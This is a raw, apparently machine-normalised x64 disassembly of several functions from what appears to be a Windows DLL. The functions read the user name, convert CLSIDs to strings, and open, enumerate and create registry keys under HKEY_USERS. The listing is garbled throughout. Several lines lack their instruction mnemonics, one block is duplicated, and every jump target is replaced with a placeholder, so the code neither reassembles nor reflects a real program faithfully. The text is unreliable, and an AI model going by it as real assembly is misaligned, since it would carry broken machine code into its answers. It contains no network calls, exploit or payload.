mov eax [ r8 + 0x8 ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x88 ]
add rsp 0x60
pop rdi
retn
[ rbx + 0x8 ]
jne r-xdata
nop [ rax ] eax
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_180003340
nop
mov eax [ r8 + 0x8 ]
test eax eax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
lea ecx [ rax + 0x1 ]
[ r8 + 0x8 ] ecx
je r-xdata
jmp r-xdata
sub_18001cfd0
mov r11 rsp
mov [ r11 + 0x10 ] rdx
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x20 ] rsi
mov rbx rdx
mov rsi rcx
lea rax [ r11 - 0x40 ]
mov [ r11 + 0x18 ] rax
xor edi edi
mov [ r11 - 0x40 ] rdi
mov [ r11 - 0x38 ] rdi
mov r8 [ rdx + 0x8 ]
mov rdx [ rdx ]
test r8 r8
je r-xdata
mov [ rsp + 0x50 ] 0x7
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x38 ] di
lea rdx [ rsi + 0x8 ]
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rsp + 0x38 ]
call sub_180001ba0
lea rcx [ rsi - 0x8 ]
lea r8 [ rsp + 0x28 ]
lea rdx [ rsp + 0x38 ]
call sub_18001ca30
nop
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
mov eax [ r8 + 0x8 ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x88 ]
add rsp 0x60
pop rdi
retn
[ rbx + 0x8 ]
jne r-xdata
nop [ rax ] eax
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_180003340
nop
mov eax [ r8 + 0x8 ]
test eax eax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
lea ecx [ rax + 0x1 ]
[ r8 + 0x8 ] ecx
je r-xdata
jmp r-xdata
sub_18001d0c0
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] rbp
mov rsi r8
mov rbp rdx
mov rbx rcx
xor r12d r12d
mov [ rsp + 0x58 ] r12d
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
mov [ rsp + 0x58 ] 0x1
mov rdx [ r8 + 0x10 ]
add rdx [ rbp + 0x10 ]
mov rdi [ rcx + 0x10 ]
cmp rdi rdx
ja r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbp
mov rcx rbx
call sub_180008240
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
mov rcx rbx
call sub_180008240
mov rax rbx
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
cmp [ rcx + 0x18 ] rdx
je r-xdata
mov r8b 0x1
call sub_180001850
test al al
je r-xdata
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi * 2 ] r12w
sub_18001d180
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x1c0
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1b8 ] rax
mov rsi r9
mov r12 r8
mov r13 rdx
mov [ rsp + 0x28 ] rdx
mov [ rsp + 0x48 ] r8
mov [ rsp + 0x40 ] r9
xor ebx ebx
mov [ rsp + 0x20 ] ebx
mov [ rsp + 0x20 ] 0x104
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x50 ] bx
lea r8d [ rbx + 0x4 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x50 ]
call sub_180003930
nop
mov ecx [ rsp + 0x20 ]
lea edx [ rbx + 0x2 ]
call sub_180021308
mov r14 rax
test rax rax
jne r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rax
call [ GetUserNameW@IAT ]
test eax eax
jne r-xdata
mov r8 rsi
mov rdx r12
lea rcx [ rsp + 0x78 ]
call sub_18001d0c0
nop
lea r8 [ rsp + 0x50 ]
mov rdx rax
mov rcx r13
call sub_180008960
nop
cmp [ rsp + 0x90 ] 0x8
jb r-xdata
mov [ rsp + 0x130 ] 0x7
mov [ rsp + 0x128 ] rbx
mov [ rsp + 0x118 ] bx
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r12
lea rcx [ rsp + 0x118 ]
call sub_180001ba0
nop
mov [ rsp + 0x180 ] 0x7
mov [ rsp + 0x178 ] rbx
mov [ rsp + 0x168 ] bx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r14
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r14
lea rcx [ rsp + 0x168 ]
call sub_180003930
nop
mov [ rsp + 0x158 ] 0x7
mov [ rsp + 0x150 ] rbx
mov [ rsp + 0x140 ] bx
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
lea rcx [ rsp + 0x140 ]
call sub_180001ba0
nop
lea r8 [ rsp + 0x168 ]
lea rdx [ rsp + 0x140 ]
lea rcx [ rsp + 0x190 ]
call sub_180018c70
nop
lea r8 [ rsp + 0x118 ]
mov rdx rax
lea rcx [ rsp + 0xa0 ]
call sub_180018c70
nop
cmp [ rsp + 0x1a8 ] 0x8
jb r-xdata
mov rcx r14
call sub_18002094c
mov r8 rsi
mov rdx r12
lea rcx [ rsp + 0x78 ]
call sub_18001d0c0
nop
lea r8 [ rsp + 0x50 ]
mov rdx rax
mov rcx r13
call sub_180008960
nop
cmp [ rsp + 0x90 ] 0x8
jb r-xdata
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] rbx
mov [ rsp + 0x78 ] bx
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_18002094c#2
mov [ rsp + 0x1a8 ] 0x7
mov [ rsp + 0x1a0 ] rbx
mov [ rsp + 0x190 ] bx
cmp [ rsp + 0x158 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x190 ]
call j_sub_18002094c#2
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] rbx
mov [ rsp + 0x78 ] bx
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_18002094c#2
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x50 ] bx
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_18002094c#2
mov [ rsp + 0x158 ] 0x7
mov [ rsp + 0x150 ] rbx
mov [ rsp + 0x140 ] bx
cmp [ rsp + 0x180 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x140 ]
call j_sub_18002094c#2
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x50 ] bx
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_18002094c#2
mov [ r12 + 0x18 ] 0x7
mov [ r12 + 0x10 ] rbx
mov [ r12 ] bx
mov rcx [ r12 ]
call j_sub_18002094c#2
mov [ rsp + 0x180 ] 0x7
mov [ rsp + 0x178 ] rbx
mov [ rsp + 0x168 ] bx
cmp [ rsp + 0x130 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x168 ]
call j_sub_18002094c#2
mov [ r12 + 0x18 ] 0x7
mov [ r12 + 0x10 ] rbx
mov [ r12 ] bx
jmp r-xdata
mov rcx [ r12 ]
call j_sub_18002094c#2
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] rbx
mov [ rsi ] bx
mov rax r13
jmp r-xdata
mov rcx [ rsi ]
call j_sub_18002094c#2
mov [ rsp + 0x130 ] 0x7
mov [ rsp + 0x128 ] rbx
mov [ rsp + 0x118 ] bx
mov rcx r14
call sub_18002094c
nop
mov ecx 0x10
call sub_180021000
mov [ rsp + 0x38 ] rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x118 ]
call j_sub_18002094c#2
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x1b8 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x1c0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rdi rbx
mov rcx rax
call sub_180017e80
mov rdi rax
jmp r-xdata
lea r8 [ rsp + 0xa0 ]
cmp [ rsp + 0xb8 ] 0x8
cmovae r8 [ rsp + 0xa0 ]
mov r9 [ rsp + 0xb0 ]
add r9 r9
movzx r15d [ rsp + 0x220 ]
movzx edx r15w
mov rcx rdi
call sub_180017f20
movzx r14d ax
shl r14d 0x10
movzx eax r15w
xor r14d eax
mov rcx rdi
call sub_180017f00
mov rcx rdi
call j_sub_18002094c#2
nop
mov edx 0x2
lea ecx [ rdx + 0x8 ]
call sub_180021308
mov r15 rax
test rax rax
jne r-xdata
mov r8 rsi
mov rdx r12
lea rcx [ rsp + 0x78 ]
call sub_18001d0c0
nop
lea r8 [ rsp + 0x50 ]
mov rdx rax
mov rcx r13
call sub_180008960
nop
cmp [ rsp + 0x90 ] 0x8
jb r-xdata
test rdi rdi
jne r-xdata
mov r9d r14d
lea r8 [ r--data ]
mov edx 0xa
mov rcx rax
call sub_180021df4
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] rbx
mov [ rsp + 0x78 ] bx
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r15
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx r15
lea rcx [ rsp + 0x78 ]
call sub_180003930
nop
lea r8 [ rsp + 0x78 ]
mov rdx r12
lea rcx [ rsp + 0xf0 ]
call sub_1800089c0
nop
lea r8 [ rsp + 0x50 ]
mov rdx rax
lea rcx [ rsp + 0xc8 ]
call sub_180008960
nop
cmp [ rsp + 0x108 ] 0x8
jb r-xdata
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] rbx
mov [ rsp + 0x78 ] bx
lea r8d [ rax + 0x4 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x78 ]
call sub_180003930
nop
mov r8 rsi
mov rdx r12
lea rcx [ rsp + 0xf0 ]
call sub_18001d0c0
nop
lea r8 [ rsp + 0x78 ]
mov rdx rax
mov rcx r13
call sub_180018c70
nop
cmp [ rsp + 0x108 ] 0x8
jb r-xdata
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] rbx
mov [ rsp + 0x78 ] bx
cmp [ rsp + 0xb8 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_18002094c#2
mov [ rsp + 0x108 ] 0x7
mov [ rsp + 0x100 ] rbx
mov [ rsp + 0xf0 ] bx
cmp [ rsp + 0x90 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xf0 ]
call j_sub_18002094c#2
mov [ rsp + 0x108 ] 0x7
mov [ rsp + 0x100 ] rbx
mov [ rsp + 0xf0 ] bx
cmp [ rsp + 0x90 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xf0 ]
call j_sub_18002094c#2
mov [ rsp + 0xb8 ] 0x7
mov [ rsp + 0xb0 ] rbx
mov [ rsp + 0xa0 ] bx
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xa0 ]
call j_sub_18002094c#2
mov rcx r15
call sub_18002094c
mov [ r13 + 0x18 ] 0x7
mov [ r13 + 0x10 ] rbx
mov [ r13 ] bx
lea rax [ rsp + 0xc8 ]
cmp r13 rax
je r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_18002094c#2
mov [ rsp + 0x90 ] 0x7
mov [ rsp + 0x88 ] rbx
mov [ rsp + 0x78 ] bx
cmp [ rsp + 0xb8 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x78 ]
call j_sub_18002094c#2
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x50 ] bx
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_18002094c#2
mov rax [ rsp + 0xe0 ]
cmp [ r13 + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0xb8 ] 0x7
mov [ rsp + 0xb0 ] rbx
mov [ rsp + 0xa0 ] bx
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xa0 ]
call j_sub_18002094c#2
mov [ r12 + 0x18 ] 0x7
mov [ r12 + 0x10 ] rbx
mov [ r12 ] bx
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rcx [ r12 ]
call j_sub_18002094c#2
mov [ rsp + 0xe0 ] 0x7
mov [ rsp + 0xd8 ] rbx
mov [ rsp + 0xc8 ] bx
cmp [ rsp + 0xb8 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xc8 ]
call j_sub_18002094c#2
mov [ r13 + 0x18 ] 0x7
mov [ r13 + 0x10 ] rbx
mov [ r13 ] bx
mov rcx [ rsp + 0xe0 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ r13 ]
call j_sub_18002094c#2
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x50 ] bx
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_18002094c#2
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] rbx
mov [ rsi ] bx
mov rax r13
jmp r-xdata
mov rcx [ rsi ]
call j_sub_18002094c#2
mov [ rsp + 0xb8 ] 0x7
mov [ rsp + 0xb0 ] rbx
mov [ rsp + 0xa0 ] bx
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xa0 ]
call j_sub_18002094c#2
mov rax [ rsp + 0xc8 ]
mov [ r13 ] rax
mov [ rsp + 0xc8 ] rbx
mov r8 [ rsp + 0xd8 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rsp + 0xc8 ]
mov rcx r13
call sub_1800205e0
mov rcx [ rsp + 0xe0 ]
jmp r-xdata
mov [ r12 + 0x18 ] 0x7
mov [ r12 + 0x10 ] rbx
mov [ r12 ] bx
jmp r-xdata
mov rcx [ r12 ]
call j_sub_18002094c#2
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x50 ] bx
cmp [ r12 + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_18002094c#2
cmp rax 0x8
jb r-xdata
mov rax [ rsp + 0xd8 ]
mov [ r13 + 0x10 ] rax
mov [ r13 + 0x18 ] rcx
mov [ rsp + 0xd8 ] rbx
mov rax rbx
mov [ rsp + 0xe0 ] rbx
jmp r-xdata
mov [ r12 + 0x18 ] 0x7
mov [ r12 + 0x10 ] rbx
mov [ r12 ] bx
jmp r-xdata
mov rcx [ r12 ]
call j_sub_18002094c#2
sub_18001da4b
cmp [ rsp + 0xb8 ] 0x8
jb r-xdata
mov [ rsp + 0xb8 ] 0x7
xor ebx ebx
mov [ rsp + 0xb0 ] rbx
mov [ rsp + 0xa0 ] bx
cmp [ rsp + 0x68 ] 0x8
jb r-xdata
mov rcx [ rsp + 0xa0 ]
call j_sub_18002094c#2
mov [ rsp + 0x68 ] 0x7
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x50 ] bx
mov rdi [ rsp + 0x48 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x50 ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rbx
mov [ rdi ] bx
mov rdi [ rsp + 0x40 ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rcx [ rdi ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rbx
mov [ rdi ] bx
mov rax [ rsp + 0x28 ]
mov rcx [ rsp + 0x1b8 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x1c0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rdi ]
call j_sub_18002094c#2
sub_18001db20
mov rax rsp
push rbp
lea rbp [ rax - 0x768 ]
sub rsp 0x860
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x750 ] rax
mov rsi rdx
xor ebx ebx
mov [ rsp + 0x40 ] ebx
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x20019
xor r8d r8d
xor edx edx
mov rcx 0xffffffff80000003
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] rbx
mov [ rsi ] bx
or rcx 0xffffffffffffffff
xor edi edi
xor eax eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
xor edx edx
mov rcx rsi
call sub_180003930
mov [ rbp - 0x80 ] bx
xor edx edx
mov r8d 0x7ce
lea rcx [ rbp - 0x7e ]
call sub_180021150
mov edi ebx
mov [ rsp + 0x40 ] 0x3e8
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] rbx
lea r9 [ rsp + 0x40 ]
lea r8 [ rbp - 0x80 ]
xor edx edx
mov rcx [ rsp + 0x48 ]
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
nop [ rax ] eax
mov [ rsp + 0x70 ] 0x7
mov [ rsp + 0x68 ] rbx
mov [ rsp + 0x58 ] bx
xor eax eax
or rcx 0xffffffffffffffff
lea rdi [ rbp - 0x80 ]
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rdx [ rbp - 0x80 ]
lea rcx [ rsp + 0x58 ]
call sub_180003930
nop
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] rbx
mov [ rsi ] bx
lea rax [ rsp + 0x58 ]
cmp rsi rax
je r-xdata
inc edi
mov [ rsp + 0x40 ] 0x3e8
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] rbx
lea r9 [ rsp + 0x40 ]
lea r8 [ rbp - 0x80 ]
mov edx edi
mov rcx [ rsp + 0x48 ]
call [ RegEnumKeyExW@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x70 ]
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
cmp [ rsp + 0x40 ] 0x9
ja r-xdata
jmp r-xdata
mov rax rsi
mov rcx [ rbp + 0x750 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x860 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rsp + 0x58 ]
call j_sub_18002094c#2
jmp r-xdata
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] rbx
mov [ rsi ] bx
mov rcx [ rsp + 0x70 ]
cmp rcx 0x8
jae r-xdata
mov rcx [ rsi ]
call j_sub_18002094c#2
mov rax [ rsp + 0x58 ]
mov [ rsi ] rax
mov [ rsp + 0x58 ] rbx
mov r8 [ rsp + 0x68 ]
lea r8 [ r8 + r8 + 0x2 ]
lea rdx [ rsp + 0x58 ]
mov rcx rsi
call sub_1800205e0
mov rcx [ rsp + 0x70 ]
jmp r-xdata
cmp rbx 0x8
jb r-xdata
mov rax [ rsp + 0x68 ]
mov [ rsi + 0x10 ] rax
mov [ rsi + 0x18 ] rcx
mov [ rsp + 0x68 ] rbx
mov [ rsp + 0x70 ] rbx
jmp r-xdata
sub_18001dd50
push rbp
push rsi
push rdi
lea rbp [ rsp - 0x47 ]
sub rsp 0xd0
mov [ rbp - 0x51 ] 0xfffffffffffffffe
mov [ rsp + 0x100 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x37 ] rax
mov rdi rdx
mov rbx rcx
mov [ rbp - 0x49 ] rdx
xor esi esi
mov [ rbp - 0x59 ] rsi
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] rsi
mov [ rbp - 0x19 ] si
lea r8d [ rsi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_180003930
nop
lea rdx [ rbx + 0x70 ]
lea r8 [ rbp - 0x19 ]
lea rcx [ rbp + 0xf ]
call sub_1800089c0
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp - 0x41 ]
call sub_180008960
nop
cmp [ rbp + 0x27 ] 0x8
jb r-xdata
mov [ rbp + 0x27 ] 0x7
mov [ rbp + 0x1f ] rsi
mov [ rbp + 0xf ] si
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf ]
call j_sub_18002094c#2
lea rdx [ rbp - 0x41 ]
cmp [ rbp - 0x29 ] 0x8
cmovae rdx [ rbp - 0x41 ]
lea rax [ rbp - 0x59 ]
mov [ rsp + 0x20 ] rax
mov r9d 0xf003f
xor r8d r8d
mov rcx 0xffffffff80000003
call [ RegOpenKeyExW@IAT ]
mov rbx [ rbp - 0x59 ]
cmp eax 0x2
jne r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_18002094c#2
cmp [ rbp - 0x29 ] 0x8
jb r-xdata
cmp [ rbp - 0x29 ] 0x8
jb r-xdata
mov [ rbp - 0x29 ] 0x7
mov [ rbp - 0x31 ] rsi
mov [ rbp - 0x41 ] si
mov rcx [ rbp - 0x41 ]
call j_sub_18002094c#2
mov [ rbp - 0x29 ] 0x7
mov [ rbp - 0x31 ] rsi
mov [ rbp - 0x41 ] si
jmp r-xdata
mov rcx [ rbp - 0x41 ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rsi
mov rax rbx
mov [ rdi ] si
mov rcx [ rbp + 0x37 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x100 ]
add rsp 0xd0
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rdi ]
call j_sub_18002094c#2
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
sub_18001dec0
push rbp
push rsi
push rdi
lea rbp [ rsp - 0x47 ]
sub rsp 0xf0
mov [ rbp - 0x51 ] 0xfffffffffffffffe
mov [ rsp + 0x120 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x37 ] rax
mov rdi rdx
mov rbx rcx
mov [ rbp - 0x49 ] rdx
xor esi esi
mov [ rbp - 0x59 ] rsi
mov [ rbp - 0x1 ] 0x7
mov [ rbp - 0x9 ] rsi
mov [ rbp - 0x19 ] si
lea r8d [ rsi + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x19 ]
call sub_180003930
nop
lea rdx [ rbx + 0x70 ]
lea r8 [ rbp - 0x19 ]
lea rcx [ rbp + 0xf ]
call sub_1800089c0
nop
mov r8 rdi
mov rdx rax
lea rcx [ rbp - 0x41 ]
call sub_180008960
nop
cmp [ rbp + 0x27 ] 0x8
jb r-xdata
mov [ rbp + 0x27 ] 0x7
mov [ rbp + 0x1f ] rsi
mov [ rbp + 0xf ] si
cmp [ rbp - 0x1 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xf ]
call j_sub_18002094c#2
lea rdx [ rbp - 0x41 ]
cmp [ rbp - 0x29 ] 0x8
cmovae rdx [ rbp - 0x41 ]
lea rax [ rbp - 0x59 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x2
xor r8d r8d
mov rcx 0xffffffff80000003
call [ RegOpenKeyExW@IAT ]
cmp eax 0x2
jne r-xdata
mov rcx [ rbp - 0x19 ]
call j_sub_18002094c#2
test eax eax
je r-xdata
lea rdx [ rbp - 0x41 ]
cmp [ rbp - 0x29 ] 0x8
cmovae rdx [ rbp - 0x41 ]
mov [ rsp + 0x40 ] rsi
lea rax [ rbp - 0x59 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] 0x2
mov [ rsp + 0x20 ] esi
xor r9d r9d
xor r8d r8d
mov rcx 0xffffffff80000003
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
mov rbx [ rbp - 0x59 ]
cmp [ rbp - 0x29 ] 0x8
jb r-xdata
mov rbx [ rbp - 0x59 ]
cmp [ rbp - 0x29 ] 0x8
jb r-xdata
mov rbx [ rbp - 0x59 ]
cmp [ rbp - 0x29 ] 0x8
jb r-xdata
mov [ rbp - 0x29 ] 0x7
mov [ rbp - 0x31 ] rsi
mov [ rbp - 0x41 ] si
mov rcx [ rbp - 0x41 ]
call j_sub_18002094c#2
mov [ rbp - 0x29 ] 0x7
mov [ rbp - 0x31 ] rsi
mov [ rbp - 0x41 ] si
jmp r-xdata
mov rcx [ rbp - 0x41 ]
call j_sub_18002094c#2
mov [ rbp - 0x29 ] 0x7
mov [ rbp - 0x31 ] rsi
mov [ rbp - 0x41 ] si
jmp r-xdata
mov rcx [ rbp - 0x41 ]
call j_sub_18002094c#2
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rsi
mov [ rdi ] si
mov rax rbx
mov rcx [ rbp + 0x37 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x120 ]
add rsp 0xf0
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rdi ]
call j_sub_18002094c#2
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
sub_18001e0a0
push rbp
push rbx
push rsi
push rdi
push r12
lea rbp [ rsp - 0x80 ]
sub rsp 0x180
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x78 ] rax
mov rdi r8
mov rsi rdx
mov r12 rcx
mov [ rsp + 0x30 ] rdx
lea rdx [ rsp + 0x38 ]
call sub_18001db20
nop
cmp [ rsp + 0x48 ] 0x0
jne r-xdata
lea rdx [ rsp + 0x20 ]
mov rcx rdi
call [ StringFromCLSID@IAT ]
mov [ rbp - 0x38 ] 0x7
xor ebx ebx
mov [ rbp - 0x40 ] rbx
mov [ rbp - 0x50 ] bx
xor eax eax
or rcx 0xffffffffffffffff
mov rdx [ rsp + 0x20 ]
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp - 0x50 ]
call sub_180003930
nop
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x60 ] bx
lea r8d [ rbx + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
call sub_180003930
nop
mov [ rbp - 0x60 ] 0x7
mov [ rbp - 0x68 ] rbx
mov [ rbp - 0x78 ] bx
lea r8d [ rbx + 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x78 ]
call sub_180003930
nop
lea r8 [ rbp - 0x78 ]
lea rdx [ rsp + 0x38 ]
lea rcx [ rbp + 0x50 ]
call sub_1800089c0
nop
mov r8 rsi
mov rdx rax
lea rcx [ rbp ]
call sub_180008960
nop
lea r8 [ rsp + 0x60 ]
mov rdx rax
lea rcx [ rbp + 0x28 ]
call sub_180018c70
nop
lea r8 [ rbp - 0x50 ]
mov rdx rax
lea rcx [ rbp - 0x28 ]
call sub_180018c70
nop
lea rcx [ r12 + 0x70 ]
mov rdx rax
call sub_180003cb0
nop
cmp [ rbp - 0x10 ] 0x8
jb r-xdata
cmp [ rsp + 0x50 ] 0x8
jb r-xdata
mov [ rbp - 0x10 ] 0x7
mov [ rbp - 0x18 ] rbx
mov [ rbp - 0x28 ] bx
cmp [ rbp + 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x28 ]
call j_sub_18002094c#2
mov [ rsp + 0x50 ] 0x7
xor ebx ebx
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x38 ] bx
jmp r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18002094c#2
mov [ rbp + 0x40 ] 0x7
mov [ rbp + 0x38 ] rbx
mov [ rbp + 0x28 ] bx
cmp [ rbp + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x28 ]
call j_sub_18002094c#2
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov [ rbp + 0x18 ] 0x7
mov [ rbp + 0x10 ] rbx
mov [ rbp ] bx
cmp [ rbp + 0x68 ] 0x8
jb r-xdata
mov rcx [ rbp ]
call j_sub_18002094c#2
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] rbx
mov [ rsi ] bx
mov rcx [ rbp + 0x78 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x180
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rsi ]
call j_sub_18002094c#2
mov [ rbp + 0x68 ] 0x7
mov [ rbp + 0x60 ] rbx
mov [ rbp + 0x50 ] bx
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x50 ]
call j_sub_18002094c#2
mov [ rbp - 0x60 ] 0x7
